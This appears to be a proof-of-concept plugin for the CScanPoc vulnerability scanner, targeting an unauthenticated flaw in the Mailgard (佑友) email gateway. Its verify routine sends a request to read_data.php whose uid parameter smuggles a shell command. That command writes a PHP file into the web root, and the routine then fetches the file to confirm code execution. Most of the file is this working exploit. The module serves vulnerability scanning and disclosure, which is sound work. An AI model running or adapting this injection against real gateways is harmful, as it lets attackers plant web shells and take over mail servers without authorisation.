# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Mailgard_0001' # 平台漏洞编号，留空
    name = '河辰通讯Mailgard佑友系列邮件网关文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD # 漏洞类型
    disclosure_date = '2015-03-31'  # 漏洞公布时间
    desc = '''
        深圳市河辰通讯Mailgard佑友系列邮件网关无需登录getshell.
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'Mailgard佑友系列邮件网关'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '7ef5e6f4-a76d-4856-b38b-6802d24fa13b'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #Refer http://www.wooyun.org/bugs/wooyun-2015-0104770
            payload = "/src%2fread_data.php%3fsd%3dxxx%26uid%3d+%26+echo+%27%3c%3fphp+echo+testvul+%3b%3f%3e%27+%3e+%2fvar%2fwww%2fnewmail%2ftestvul.php+%26+%26action%3dzzz%26file_name%3d%26user%3dtest%40123.com"
            r1 = requests.get(self.target + payload)
            r2 = requests.get(self.target + "/testvul.php")
            if r2.status_code == 200 and 'testvul' in r2.content: 
                #security_hole(url+payload)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
